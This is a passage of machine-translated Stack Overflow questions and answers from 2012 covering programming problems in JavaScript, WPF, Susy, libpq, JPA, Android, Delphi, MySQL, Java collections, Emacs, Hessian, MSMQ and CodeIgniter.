Instagram.Template = {};
Instagram.Template.Views = {

  "photo": "<div class='photo'>" +
            "<a href='{url}' target='_blank'><img class='main' src='{photo}' width='250' height='250' style='display:none;' onload='Instagram.App.showPhoto(this);' /></a>" +
            "<span class='heart'><strong>{count}</strong></span><span class='comment'><strong>{count2}</strong></span>" +
            "<span class='avatar'><iframe src='//www.facebook.com/plugins/like.php?href={url}&amp;send=false&amp;layout=button_count&amp;width=40&amp;show_faces=true&amp;action=like&amp;colorscheme=light&amp;font&amp;height=21&amp;' scrolling='no' frameborder='0' style='border:none; overflow:hidden; width:80px; height:21px;' allowTransparency='true'></iframe></span>" +
          "</div>"
};

Instagram.Template.generate = function(template, data){
  var re, resource;

  template = Instagram.Template.Views[template];
  for(var attribute in data){
    re = new RegExp("{" + attribute + "}","g");
    template = template.replace(re, data[attribute]);
  }
  return template;
};

// ************************
// ** Main Application Code
// ************************
(function(){

  function init(){
    bindEventHandlers();
  }

  function toTemplate(photo){
    photo = {
      count: photo.likes.count,
      count2: photo.comments.count,
      avatar: photo.user.profile_picture,
      photo: photo.images.low_resolution.url,
      url: photo.link
    };

    return Instagram.Template.generate('photo', photo);
  }  

  function toScreen(photos){
    var photos_html = '';

    $('.paginate a').attr('data-max-tag-id', photos.pagination.next_max_id)
                    .fadeIn();

    $.each(photos.data, function(index, photo){
      photos_html += toTemplate(photo);
    });

    $('div#photos-wrap').append(photos_html);
  }

  function generateResource(tag){
    var config = Instagram.Config, url;

    if(typeof tag === 'undefined'){
      throw new Error("Resource requires a tag. Try searching for cats!");
    } else {
      // Make sure tag is a string, trim any trailing/leading whitespace and take only the first 
      // word, if there are multiple.
      tag = String(tag).trim().split(" ")[0];
    }

    url = config.apiHost + "/v1/tags/" + tag + "/media/recent?callback=?&count=10&client_id=" + config.clientID;

    return function(max_id){
      var next_page;
      if(typeof max_id === 'string' && max_id.trim() !== '') {
        next_page = url + "&max_id=" + max_id;
      }
      return next_page || url;
    };
  }

  function paginate(max_id){    
    $.getJSON(generateUrl(tag), toScreen);
  }

  function search(tag){
    resource = generateResource(tag);
    $('.paginate a').hide();
    $('#photos-wrap *').remove();
    fetchPhotos();
  }

  function fetchPhotos(max_id){
    $.getJSON(resource(max_id), toScreen);
  }

  function bindEventHandlers(){
    $('body').on('click', '.paginate a.button', function(){
      var tagID = $(this).attr('data-max-tag-id');
      fetchPhotos(tagID);
      return false;
    });

    // Bind an event handler to the `click` event on the form's button
    $('form#search button').click(function(){
      // Extract the value of the search input text field.
      var tag = $('input.search-tag').val();

      // Invoke `search`, passing `tag`.
      search(tag);

      // Stop event propagation.
      return false;
    });

  }

  function showPhoto(p){
    $(p).fadeIn();
  }

  Instagram.App = {
    search: search,
    showPhoto: showPhoto,
    init: init
  };
})();

$(function(){
  Instagram.App.init();

  // Start with a search on cats; we all love cats.
  Instagram.App.search('hwplus');  
}); 
```

如果照片已经结束，请帮助我找到一种方法来禁用“查看更多”按钮。有没有办法在 JSON 对象中添加缓存并从 Javascript 中获取变量？

感谢和赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-30T19:43:02.240

一旦你到达照片的末尾，`next_max_tag_id`就不存在了。您需要检查是否`next_max_tag_id`存在，如果不存在，请禁用该按钮。您将在这一行实现您的新代码，可能会为用户创建一个变量`photos.pagination.next_max_id`，当用户单击按钮时，检查该变量是否已定义。

未经测试的代码：

```
var next_max = photos.pagination.next_max_id;

if (next_max == 'undefined') {
      var next_max = 'end';
      $('.paginate a').addClass('disabled');
}

//define .disabled in your CSS

$('.paginate a').attr('data-max-tag-id', next_max).fadeIn(); 
```

# c# - 无法从 Ancestor Datagrid 获取数据

> ID：13524594
> 
> 赞同：0
> 
> 时间：2012-11-23T07:16:50.560
> 
> 标签：c#, .net, wpf, xaml, binding

我有以下数据网格：

```
<DataGrid Name="dataGridWorkOrders" ItemsSource="{StaticResource workorders}"  Grid.Row="1" IsReadOnly="True" HorizontalAlignment="Stretch" AutoGenerateColumns="False" VerticalAlignment="Top">
            <DataGrid.Columns>
 <DataGridTextColumn Header="Total Quantity" Binding="{Binding TotalQuantity}"/>
            </DataGrid.Columns>

  <DataGrid.RowDetailsTemplate>
                <DataTemplate>
                    <Border BorderThickness="0" Background="BlanchedAlmond" Padding="10">
                        <DataGrid IsReadOnly="True" ItemsSource="{Binding ScheduleCollection}" AutoGenerateColumns="False">
<DataGrid.Columns>

  <DataGridTextColumn Header="Total Quantity"  Binding="{Binding Path=TotalQuantity, RelativeSource={RelativeSource AncestorType={x:Type DataGrid}}}"/>

</DataGrid.Columns> 
```

现在在 rowdetails 模板中，我尝试访问绑定到父数据网格行的 TotalQuantity。我尝试使用祖先但不工作

**编辑**
模型代码：

```
class WorkOrders : ObservableCollection<WorkOrder>
    {
        public WorkOrders()
        {
            var orderList = OrderDetailsProvider.GetOrders() as List<WorkOrder>;

            orderList.ForEach(
                        order => this.Add(order));
        }
    }

public class WorkOrder:BaseEntity
    {
        private string orderID;
        private int totalQuantity;
        private string status;
        private ObservableCollection<Schedule> scheduleCollection;

       ....All the fields exposed as proporties
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T08:13:16.550

您可以使用`DataGridRow`在树上找到 2 个级别的绑定来完成此操作。
找到的第一个是 DataGrid 中的那个`RowDetailsTemplate`（我们不想要），第二个是当前的父行`RowDetailsTemplate`。

通过绑定到`DataContext.TotalQuantity`on found`DataGridRow`你应该得到你正在寻找的值。

因此，在详细信息模板的列中，您可以执行以下操作：

```
<DataGridTextColumn Header="Total Quantity"
    Binding="{Binding Path=DataContext.TotalQuantity, 
             RelativeSource={RelativeSource AncestorType=DataGridRow, AncestorLevel=2}}" /> 
```

# responsive-design - Susy：针对不同的屏幕尺寸使用不同的布局

> ID：13524596
> 
> 赞同：5
> 
> 时间：2012-11-23T07:17:13.003
> 
> 标签：responsive-design, compass-sass, susy-compass

我正在使用 Susy 构建一个移动优先网站，并希望为不同的屏幕尺寸提供不同的布局。每个布局都有自己的一组列、列宽和装订线宽度。

我该怎么做呢？

* * *

**我的尝试：**

**1.老苏西法**

在旧的 Susy 中，你会这样做：

```
$base-font-size: 10px;
$show-grid-backgrounds  : true;

$total-columns       : 4;
$column-width        : 6.250em;
$gutter-width        : 1em;
$gutter-padding      : $gutter-width;

body {
background:pink;    
}

@media only screen and (min-width: 480px) {
$total-columns       : 3;
/*$column-width        : 12.567em;
$gutter-width        : 3em;
$gutter-padding      : $gutter-width;*/

body {
background:yellow;  
}

}

@media only screen and (min-width: 600px) {
$total-columns       : 6;
/*$column-width        : 7.500em;
$gutter-width        : 2em;
$gutter-padding      : $gutter-width;*/

body {
background:blue;    
}

}

@media only screen and (min-width: 768px) {
$total-columns       : 6;
/*$column-width        : 7.500em;
$gutter-width        : 2em;
$gutter-padding      : $gutter-width;*/

body {
background:green;   
}

}

@media only screen and (min-width: 960px) {
$total-columns       : 6;
/*$column-width        : 8.833em;
$gutter-width        : 3em;
$gutter-padding      : $gutter-width;*/

body {
background:red; 
}

} 
```

[背景颜色是这样我可以看出它正在工作]

在 New Susy 中，当我这样做时，无论屏幕大小如何，列数始终为 6。它们也不是正确的列大小。

**2\. 断点法** New Susy 有一个新的[断点法](http://susy.oddbird.net/guides/reference/#ref-at-breakpoint)，可以让你为不同的布局指定不同的列。这就是我使用它的方式：

```
$base-font-size: 10px;
$show-grid-backgrounds  : true;

$total-columns       : 4;
$column-width        : 6.250em;
$gutter-width        : 1em;
$gutter-padding      : $gutter-width;

body {
background:pink;    
}

.layout-primary {
  @include container;
  @include susy-grid-background;
}

@include at-breakpoint(480px 3) {
  .layout-primary {
  @include container;
 }

}

@include at-breakpoint(600px 6) {
  .layout-primary {
  @include container;
 }
}

@include at-breakpoint(768px 6) {
  .layout-primary {
  @include container;
 }
} 
```

当我使用此代码时，无论布局如何，列现在总是停留在 4。您也不能使用此方法来指定不同的列宽/填充值。

苏西太棒了，我知道我误会了什么。但是我花了很长时间查看文档并尝试不同的东西，却看不出我做错了什么。

[我知道我以前](https://stackoverflow.com/questions/9782914/susy-change-the-number-of-columns-according-to-screen-size)问过这个问题，但那是针对旧的 Susy 版本的。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T22:44:53.303

您在每个断点的后台看到 4 列的原因是因为您只`@include susy-grid-background;`在 4 列上下文中声明。我认为有人已经提交了一个错误来创建断点/背景快捷方式，所以很快就会出现。与此同时，你必须在你调用的任何地方重新调用那个 mixin `container`。

```
@include at-breakpoint(600px 6) {
  .layout-primary {
    @include container;
    @include susy-grid-background;
  }
} 
```

但你是对的，`at-breakpoint`此时只允许更改列数。我想扩展它，所以如果你在 github 上提交错误，我会很乐意看看它。与此同时，有一个`with-grid-settings`mixin 可以让你改变所有的基本设置（如果我能很快的话，我也希望在那里得到高级设置）。

```
@include at-breakpoint(600px 6) {
  @include with-grid-settings(6,6em,1em,1em) {
    .layout-primary {
      @include container;
      @include susy-grid-background;
    }
  }
} 
```

# c++ - libpq - 编写测试

> ID：13524599
> 
> 赞同：0
> 
> 时间：2012-11-23T07:18:13.423
> 
> 标签：c++, unit-testing, postgresql, libpq

我正在为 libpq 编写一个 C++ 包装器。但是我不知道应该如何编写单元测试。我最初的反应是将 libpq 接口包装成可模拟的东西，但这违背了目的。有没有人这样做过？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:25:17.390

不要那样做。[libpq 已经有一个 C++ 包装器，称为`libpqxx`](http://pqxx.org/).

我将使用 cppunit 进行测试，使用前代码和后代码，并在路径上`initdb`启动一个新的新 PostgreSQL 集群。`initdb``pg_ctl`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T07:59:50.230

对于单元测试，您可以模拟您的一些类（数据库连接、查询、参数绑定器）。对于较大的功能测试，您可以使用与测试数据库的真实连接。对于我几年前做的两个 libpq C++ 包装器（一个用于 Qt，另一个用于 C++/STL），效果很好。

关于 libpqxx - 它仍然不支持二进制 libpq v3 协议，在某些情况下（例如导入/导出大量二进制数据）可能是一个瓶颈。除此之外，它使用起来非常简单，而且非常有趣。

# java - 为什么 JPA 中的命名本机查询会产生类型转换异常

> ID：13524601
> 
> 赞同：0
> 
> 时间：2012-11-23T07:18:22.113
> 
> 标签：java, eclipselink

```
 List<EmailMaster> result = null;
    EntityManager eManager = getEntityManager();
    Query query = eManager.createNamedQuery("EMAIL_MASTER_BYSTATUS");
    query.setParameter(1, "0");
    result = query.getResultList();----here no problem why
    System.out.println("EMAIL_MASTER_BYSTATUS :" + result.size()); 
```

当我迭代类型转换错误时

```
 EmailMaster em = emIterator.next(); 
```

只有当我将它放入 em 时才会出现问题。

映射.xml

```
 <named-native-query name="EMAIL_MASTER_BYSTATUS">
        <query >SELECT * FROM RDT_EMAIL_MASTER WHERE STATUS = ?</query>
    </named-native-query> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:32:42.940

你应该定义结果类。见这里 [http://docs.jboss.org/hibernate/orm/3.3/reference/en/html/querysql.html](http://docs.jboss.org/hibernate/orm/3.3/reference/en/html/querysql.html)

```
<resultset name="personAddress">
    <return alias="person" class="eg.Person"/>
    <return-join alias="address" property="person.mailingAddress"/>
</resultset>

<sql-query name="personsWith" resultset-ref="personAddress">
    SELECT person.NAME AS {person.name},
           person.AGE AS {person.age},
           person.SEX AS {person.sex},
           address.STREET AS {address.street},
           address.CITY AS {address.city},
           address.STATE AS {address.state},
           address.ZIP AS {address.zip}
    FROM PERSON person
    JOIN ADDRESS address
        ON person.ID = address.PERSON_ID AND address.TYPE='MAILING'
    WHERE person.NAME LIKE :namePattern
</sql-query> 
```

# android - 我看不到我的自定义进度对话框

> ID：13524602
> 
> 赞同：1
> 
> 时间：2012-11-23T07:18:24.803
> 
> 标签：android, android-spinner, android-dialog, android-progressbar

我尝试了以下代码来创建自定义进度对话框。但我没有得到想要的输出。

以下是我的 MainActivity.java 代码

```
public class MainActivity extends Activity {

private ProgressDialog mProgressDialog;  

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
}
     @Override
        protected Dialog onCreateDialog(int id) {
mProgressDialog = new ProgressDialog(MainActivity.this);
mProgressDialog.setIcon(R.drawable.alert_dialog_icon);
mProgressDialog.setTitle(R.string.select_dialog);
mProgressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
    return mProgressDialog;
}   } 
```

strings.xml 文件如下：

```
<?xml version="1.0" encoding="utf-8"?>
<resources>

<string name="select_dialog">Sample</string>
<string name="select_dialog_show">List dialog</string>
<string name="app_name">Dialog</string>
</resources> 
```

activity_main.xml 如下：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
 xmlns:tools="http://schemas.android.com/tools"
 android:layout_width="match_parent"
 android:layout_height="match_parent"
 tools:context=".MainActivity" >     
</RelativeLayout> 
```

DialogManifest.xml 如下：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
 package="com.sample.dialog"
 android:versionCode="1"
 android:versionName="1.0" >
<uses-sdk
    android:minSdkVersion="1"
    android:targetSdkVersion="17" />

<application
    android:allowBackup="true"
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:name="com.sample.dialog.MainActivity"
        android:label="@string/app_name" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
</application> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:22:20.680

您好，请参考这个[网址](http://www.helloandroid.com/tutorials/how-display-custom-dialog-your-android-application)

创建自定义视图时，您应该将自定义布局提供给如下对话框

```
dialog.setContentView(R.layout.maindialog); 
```

# android - 从 2.2 到 4.2 的 Android 操作兼容性

> ID：13524604
> 
> 赞同：3
> 
> 时间：2012-11-23T07:18:32.100
> 
> 标签：android, android-actionbar, actionbarsherlock

我正在尝试在 Android 上创建一个应用程序，并希望将应用程序一直定位到 Android 2.2。

我对如何配置应用程序有点困惑

最小 SDK：2.2 目标 SDK：4.1 编译 SDK 针对：4.2

这是我在创建新的 Android 项目时得到的默认配置。

我是否还需要使用 ActionBar Sherlock 来支持旧版本？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T07:29:35.060

除非您使用任何不适用于较低版本的 API，否则您不需要任何额外的库，如 ActionBarSherlock。

但是，如果您正在使用任何特定的 API 并希望它们向后兼容，例如`Fragments`，`ActionBar`等，那么您可以使用支持最低 API 级别 4的[支持库。](http://developer.android.com/tools/extras/support-library.html)

从*支持库页面*引用：

> 支持的最低 API 级别：4
> 
> 支持包包含静态“支持库”，您可以将其添加到 Android 应用程序中，以便使用旧平台版本不可用的 API，或者提供不属于框架 API 的“实用程序”API。目标是通过提供更多可以与应用程序捆绑的 API 来简化您的开发，从而减少对平台版本的担忧。

ABS 是*支持库*的扩展。这是来自 ABS 页面链接：[ActionBarSherlock](http://actionbarsherlock.com/)：

> 该库将在适当时自动使用本机操作栏，或者会自动围绕您的布局包装自定义实现。这使您可以轻松地为 2.x 及更高版本的每个版本的 Android 开发带有操作栏的应用程序。

总而言之，如果您正在使用旧 SDK 中不可用的 API，那么您可以使用上面列出的两个中的任何一个。如果您**不**使用特定于较新 SDK 的 API，则不需要 ABS 或支持库。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-23T07:26:49.243

**Min SDK** = 您希望支持的最少 API，即 2.2

**目标 SDK** = 您要测试的 API。如果未设置，则默认值为 Min SDK。通常目标是您想要支持的 Max API 或最新的 API。这是为了告诉应用程序使用最新的 API 功能，但如果不可能，允许向后兼容。

我从未听说过**编译 SDK**

如果您只使用 2.2 API 元素，则不需要任何支持库。

对于 <3.0 API 中不存在的片段等，您必须使用支持库。

# delphi - 防止在保存时删除具有空主体的方法

> ID：13524606
> 
> 赞同：6
> 
> 时间：2012-11-23T07:18:45.303
> 
> 标签：delphi, ide, delphi-7

一直按Ctrl+S是我的一个很矛盾的习惯。不利的一面是，delphi 在保存时会删除空函数/过程。

有没有办法防止 IDE 在保存时删除带有空主体的函数/过程？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-23T09:44:14.270

*根据 OP 请求从评论转换。我的评论对于答案来说太小了，所以我将添加一些可能对 OP 来说已经很明显的细节。*

> 这仅发生在事件处理程序中¹。立即写下它们或用*todo*评论它们²

¹ 也就是说，[事件处理程序](http://docwiki.embarcadero.com/RADStudio/XE3/en/Events)是*设计类*的方法，它们由*[表单设计](http://docwiki.embarcadero.com/RADStudio/XE3/en/Form_Designer)*器创建、列出和删除（如果在保存或编译时发现为空） （这包括数据模块设计器和任何其他安装的自定义设计器）。授予您可能熟悉 C# 背景的*代表。*其他任何方式均受“人工”管理。

² [TODO 项目](http://docwiki.embarcadero.com/RADStudio/XE3/en/Using_To-Do_Lists)（`Ctrl+Shift+T`在默认键绑定中）绝对比空白评论更好：

```
procedure TForm1.MagicButton1Click(Sender: TObject);
begin
  { TODO -ctomorrow : I'm going to write the code, I promise! }
end; 
```

### 可能的特殊情况

`TAction`带有`AutoCheck`set **must**（请参阅下面[Rufo 爵士](https://stackoverflow.com/users/1744164)的评论以了解运行时的另一种可能性）将其`OnExecute`分配为`Enabled`. 在这种情况下，*设计类*中不可避免地会有这样的空白事件处理程序。例子：

```
procedure TMonitor.AutoCheckActionExecute(Sender: TObject);
begin
  // dummy stub
  { DONE -crefactor : merge with other stub(s) }
end; 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-11-23T07:22:55.917

只需添加一个空评论，例如`//`

```
begin 
//
end; 
```

另一种方法是将声明移至`published part`

```
type
  TForm5 = class(TForm)
    Button1: TButton;
    Button2: TButton;
    procedure Button1Click(Sender: TObject); // will be removed if empty
  private
    { Private-Deklarationen }
  public
  published
    procedure Button2Click(Sender: TObject); // will not be removed if empty

    { Public-Deklarationen }
  end; 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-11-23T08:03:27.453

> 有没有办法防止 IDE 在保存时删除带有空主体的函数/过程？

IDE 中没有选项可以禁用此行为。

# mysql - 如何在 MySql 中检查 zer0 时间戳？

> ID：13524607
> 
> 赞同：0
> 
> 时间：2012-11-23T07:18:46.577
> 
> 标签：mysql, timestamp

我有一个 MySql 表，其中包含一些类型的字段`TIMESTAMP`。

我想检测那些“无效”的（从未插入过数据并且没有默认值）。

我可以使用一些 MySql 常量吗？例如`SELECT .. WHERE timestamp_column=INVALID_DATE_TIME`

还是我应该只与“0000-00-00 00:00:00”比较？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T07:27:45.353

您不能将无效日期存储到**TIMESTAMP**列中。TIMESTAMP 列始终需要有效日期。

只有 NULL 值可以帮助你。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T07:20:40.633

是的，`null`或者`"0000-00-00 00:00:00"`如果您在插入时没有考虑到这一点

# java - 如何制作由地图支持的集合？

> ID：13524608
> 
> 赞同：7
> 
> 时间：2012-11-23T07:18:48.103
> 
> 标签：java, collections, map, set

[Collections](http://docs.oracle.com/javase/6/docs/api/java/util/Collections.html)类中有一个方法。

`Set<E> Collections.newSetFromMap(<backing map>)`

*支持地图*和地图*支持的集合*是什么意思？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-23T07:23:10.123

也许看看实现会很有启发性：

```
private static class SetFromMap<E> extends AbstractSet<E>
    implements Set<E>, Serializable
{
    private final Map<E, Boolean> m;  // The backing map
    private transient Set<E> s;       // Its keySet

    SetFromMap(Map<E, Boolean> map) {
        if (!map.isEmpty())
            throw new IllegalArgumentException("Map is non-empty");
        m = map;
        s = map.keySet();
    }

    public void clear()               {        m.clear(); }
    public int size()                 { return m.size(); }
    public boolean isEmpty()          { return m.isEmpty(); }
    public boolean contains(Object o) { return m.containsKey(o); }
    public boolean remove(Object o)   { return m.remove(o) != null; }
    public boolean add(E e) { return m.put(e, Boolean.TRUE) == null; }
    public Iterator<E> iterator()     { return s.iterator(); }
    public Object[] toArray()         { return s.toArray(); }
    public <T> T[] toArray(T[] a)     { return s.toArray(a); }
    public String toString()          { return s.toString(); }
    public int hashCode()             { return s.hashCode(); }
    public boolean equals(Object o)   { return o == this || s.equals(o); }
    public boolean containsAll(Collection<?> c) {return s.containsAll(c);}
    public boolean removeAll(Collection<?> c)   {return s.removeAll(c);}
    public boolean retainAll(Collection<?> c)   {return s.retainAll(c);}
    // addAll is the only inherited implementation

    private static final long serialVersionUID = 2454657854757543876L;

    private void readObject(java.io.ObjectInputStream stream)
        throws IOException, ClassNotFoundException
    {
        stream.defaultReadObject();
        s = m.keySet();
    }
} 
```

**编辑 - 添加说明：**

您提供的地图用作`m`此对象中的字段。

当您向集合添加元素时，它会向地图`e`添加一个条目。`e -> true`

```
public boolean add(E e) { return m.put(e, Boolean.TRUE) == null; } 
```

因此，此类通过简单地忽略事物映射到的值并仅使用键，将您`Map`变成一个行为类似于 a 的对象。`Set`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-23T07:55:05.840

我刚刚为你做了一个示例代码

```
HashMap<String, Boolean> map = new HashMap<String, Boolean>();

Set<String> set = Collections.newSetFromMap(map);

System.out.println(set);

for (int i = 0; i < 10; i++)
    map.put("" + i, i % 2 == 0);

System.out.println(map);

System.out.println(set); 
```

和输出

```
[]
{3=false, 2=true, 1=false, 0=true, 7=false, 6=true, 5=false, 4=true, 9=false, 8=true}
[3, 2, 1, 0, 7, 6, 5, 4, 9, 8] 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-23T07:42:28.250

简单地说，[Collections.newSetFromMap](http://docs.oracle.com/javase/6/docs/api/java/util/Collections.html#newSetFromMap%28java.util.Map%29)使用提供的`Map<E>`实现来存储`Set<E>`元素。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T07:36:32.033

Set 在内部使用 Map 来存储值。这里的backing map指的是set内部使用的set map。了解更多信息。 [http://www.jusfortechies.com/java/core-java/inside-set.php](http://www.jusfortechies.com/java/core-java/inside-set.php)

# emacs - 在名称包含空格的目录中导航

> ID：13524609
> 
> 赞同：1
> 
> 时间：2012-11-23T07:18:49.023
> 
> 标签：emacs, emacs24

我正在使用 Windows 7、EmacsW32 和 Emacs23

我试图在一个目录中导航，该目录的名称在 Emacs 中带有空格。因此，我尝试通过以下方式在 Dired 模式下导航到它：

Cxd

然后导航到带有空格的目录名称（例如我的文档），并且建议和自动完成功能（按 TAB 时）不起作用。如何在不删除空格的情况下导航到此类目录中的文件夹和文件？

更新：我在某些目录中尝试了一些其他带有空格的路径，它可以工作。我不知道它在哪些情况下工作和失败。它适用于程序文件，但不适用于我的文档。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T08:35:44.060

但是，我无法复制此特定问题：

要输入文字空格，请键入`C-q``SPC`

`C-q`运行`quoted-insert`确保将键入的下一个字符插入当前缓冲区的命令，这在相关键绑定到某个函数时很有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:32:03.573

我在黑暗中拍摄，但 unix 的大小写转义是“\”，我相信 windows 也是如此。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T07:46:22.873

这可能无法直接解决您的问题。

正如您所描述的，我认为您现在可能不会使用[ido-mode](http://emacswiki.org/emacs/InteractivelyDoThings)。emacs 中的默认选项卡完成很弱。试试ido-mode，太棒了。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T09:35:49.647

问题不在于其中有空格的文件夹。问题仅出在“我的文档”、“我的视频”和类似名称的文件夹中。

当我进入 windows 文件浏览器并检查文件夹 My Documents 的路径时，它显示为 C:/..../Documents/...

因此，我尝试在 Emacs 中打开 Documents 而不是 My Documents 并且它可以工作。现在我可以在 Documents 下访问我的文件了。

# java - Hessian 排除字段

> ID：13524612
> 
> 赞同：0
> 
> 时间：2012-11-23T07:19:12.297
> 
> 标签：java, spring, hessian

在[编写了 hessian 服务](https://stackoverflow.com/questions/4753852/writing-hessian-serivce)之后，我在我的 spring 应用程序中设置了 Hessian webservice 及其工作。

使用 org.springframework.remoting.caucho.HessianServiceExporter - SpringFramework 3.1，Hessian 4.0.1，

```
public interface RetailService {
    List<User> getUserList();
}

@Component
public class RetailServiceImpl implements RetailService {
    public List<User> getUserList() {
        List<User> list=//get from db
        return list;
    }
}

class User{
    String name,otherFields;

    //Exclude this from serialization
    Role role;
} 
```

如何从序列化中排除某些字段。我可以编写一个不包括 Role 的包装器/继承类，但我更喜欢使用现有类本身的简单（如注释）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:21:08.573

使用`transient`- 防止字段序列化的关键字：

```
transient Role role; 
```

有关更多信息，请参阅[此链接](https://stackoverflow.com/questions/910374/why-does-java-have-transient-variables)。

# workflow-foundation-4 - 使用 AppFabric 托管的 WF 进行 MSMQ 调整

> ID：13524616
> 
> 赞同：2
> 
> 时间：2012-11-23T07:20:02.877
> 
> 标签：workflow-foundation-4, msmq, appfabric

场景：在 AppFabric 中托管的 WF 服务。MSMQ 传输。节流设置为高值。MaxConcurrentCalls 为 64。

客户端一次发送 3000 个请求。

问题：MSMQ 侦听器激活器似乎不遵守限制限制，一旦当前执行的实例数量增加，就会开始引发有害消息异常。

稍后我将尝试通过将 WF 实例设置为在空闲时立即卸载来解决此问题，这应该会有所帮助。有没有办法配置激活器来处理这些限制，或者任何更可靠的解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T21:33:01.700

造成这种情况的原因之一是长时间运行的工作流程（5 秒以上）。

MSMQ 适配器从队列中批量读取消息并推送到工作流中，快速饱和容量并导致超时和多次投递尝试，从而导致毒消息。

要确保的一件事是，在您的服务节流设置中，最大实例数 > 最大调用数，例如：

```
 <serviceThrottling 
       maxConcurrentCalls="5"
       maxConcurrentInstances="10" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-14T10:08:51.740

WF 仅在 Receive-SendReply 范围内遵守 MaxConcurrentCalls 限制（即 WCF 调用仍在进行中）。由于您使用 MSMQ 绑定并因此使用单向调用（仅接收），因此 MaxConcurrentCalls 基本上是无关紧要的。

使用 MaxConcurrentInstances 来控制有多少工作流正在运行/在内存中。20000 似乎太高了。

# codeigniter - 使用控制器时出现 Codeigniter 500 内部服务器错误

> ID：13524617
> 
> 赞同：2
> 
> 时间：2012-11-23T07:20:10.113
> 
> 标签：codeigniter

我有一个网站，直到几天前还运行良好。它设置在不同的子域中，使用 codeigniter 进行蚀刻。主网站很好并且运行良好，但是当我登录时，admin us 域突然开始显示 500 错误。我可以通过输入地址来访问它的不同区域，例如

但是，当我返回主页[http://admin.mysite.com](http://admin.mysite.com)时，它会弹出 500 错误。

同样，当我尝试提交要在网站上发布的文章时，也会发生相同的 500 错误。似乎每当我需要使用控制器时，它都会产生 500 错误。

我不认为这是 htaccess，它根本没有改变（实际上我已经尝试从备份中恢复整个域）并且 500 错误仍然存​​在。

我玩弄了 apache 问题的想法，但设置了 mod_rewrite，事实上，由于主域上的站点仍在运行，这使得它更加令人费解。

谁能把我推向正确的方向。和以往一样，我希望我问的是正确的问题。我一直试图连续两天解决这个问题，但我很茫然！

编辑：我终于设法产生了一个错误：

> 致命错误：未捕获的异常“异常”，带有消息“GAPI：请求报告数据失败。错误：“GDatainsufficientPermissionsUser 对此配置文件没有足够的权限。”在 /var/www/vhosts/dealersupport.co.uk/admin/application/third_party/analytics/gapi.class.php:218 堆栈跟踪：#0 / var/www/vhosts/dealersupport.co.uk/admin/application/modules/analytics/libraries/analytics_lib.php(86): gapi->requestReportData('20924509', Array, Array, Array, NULL, '2011-12 -23', '2012-11-23') #1 /var/www/vhosts/dealersupport.co.uk/admin/application/controllers/home.php(34): Analytics_lib->get() #2 [内部功能]：首页->索引（）＃3 /var/www/vhosts/dealersupport.co.uk/admin/system/core/CodeIgniter.php（359）：call_user_func_array（数组，

编辑2：这：

> 致命错误：无法访问第 459 行 /var/www/vhosts/dealersupport.co.uk/admin/application/modules/news/controllers/news.php 中的受保护属性 MY_Form_validation::$CI

EDIT3：为了完整起见，这里是 htaccess

> 选项 +FollowSymLinks +SymLinksIfOwnerMatch RewriteEngine On
> 
> 选项 - 多视图
> 
> # 防止通过浏览器访问所有 htaccess 文件。命令允许，拒绝拒绝所有
> 
> 重写引擎开启
> 
> ＃快捷方式全局可访问的设计位置，以向用户隐藏这些文件的真实位置。RewriteRule ^(css|js|images)/(.*)$ application/assets/$1/$2 [L] RewriteRule ^modules/([a-z_]+)/(css|js|images)/(.*) $ 应用程序/模块/$1/assets/$2/$3 [L]
> 
> ```
> # Checks to see if the user is attempting to access a valid file,
> # such as an image or css document, if this isn't true it sends the
> # request to index.php
> RewriteCond %{REQUEST_FILENAME} !-f
> RewriteCond %{REQUEST_FILENAME} !-d
> RewriteRule ^(.*)$ index.php?/$1 [L] </IfModule> 
> ```
> 
> # 如果我们没有安装 mod_rewrite，所有 404 的 # 都可以发送到 index.php，一切正常。# 提交人：ElliotHaughin
> 
> ```
> ErrorDocument 404 /index.php </IfModule> 
> ```
> 
> # 关闭 ETags，以提高性能。
> 标头未设置 ETag FileETag 无
> 
> # 防止目录列表。选项 - 索引

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T13:51:44.317

也许这不是同一个问题，但过去我在某些控制器的 CI 中遇到了一些错误 500，因为 PHP 控制器文件的编码以某种方式损坏。

唯一的解决方案是重新创建控制器（新的 PHP 文件，复制代码......）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-06-17T10:20:26.323

